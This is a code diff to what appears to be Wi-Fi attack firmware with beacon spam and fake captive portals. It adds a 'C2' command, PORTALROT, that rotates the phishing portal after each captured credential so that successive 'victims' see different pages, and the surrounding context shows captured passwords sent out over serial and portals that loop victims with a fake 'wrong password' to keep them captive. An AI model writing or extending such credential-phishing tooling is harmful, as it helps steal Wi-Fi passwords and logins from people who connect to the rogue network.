@@ -85,6 +85,9 @@ bool randomSSID, rickroll, ghostSpam;
 char randomString[19];
 int allChannels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 36, 40, 44, 48, 149, 153, 157, 161};
 int portal=0;
+// C2: rotate the served portal on every captured credential (so successive victims get
+// different pages). Toggled from the host with PORTALROT <0|1>.
+static bool portal_rot = false;
 int localPortNew=1000;
 char wpa_pass[64];
 char ap_channel[4];
@@ -1213,6 +1216,13 @@ void loop() {
       customPortal[customPortalLen] = 0;
       String r = "PORTALHTML:+" + String((unsigned)added) + " total=" + String((unsigned)customPortalLen);
       Serial.println(r); Serial1.println(r);
+    }else if(readString.substring(0,9)=="PORTALROT"){
+      // C2: enable/disable portal rotation. Args: PORTALROT <0|1>
+      int s1 = readString.indexOf(' ');
+      int v = (s1 > 0) ? readString.substring(s1+1, readString.length()-1).toInt() : 0;
+      portal_rot = (v != 0);
+      String r = String("PORTALROT:") + (portal_rot ? "on" : "off");
+      Serial.println(r); Serial1.println(r);
     }else if(readString.substring(0,11)=="PORTALCLEAR"){
       customPortalLen = 0;
       customPortal[0] = 0;
@@ -2072,6 +2082,8 @@ void loop() {
                 if (datos.length() > 0) {
                   Serial1.print("EV:");
                   Serial1.println(datos);
+                  // C2: advance to the next built-in portal for the next victim.
+                  if (portal_rot) portal = (portal + 1) % 6;
                   // Portal pages now loop the victim ("wrong password"), so we keep the
                   // network captive and never validate (no 204) -> the sign-in keeps
                   // coming back. Re-enable the line below to instead clear the OS
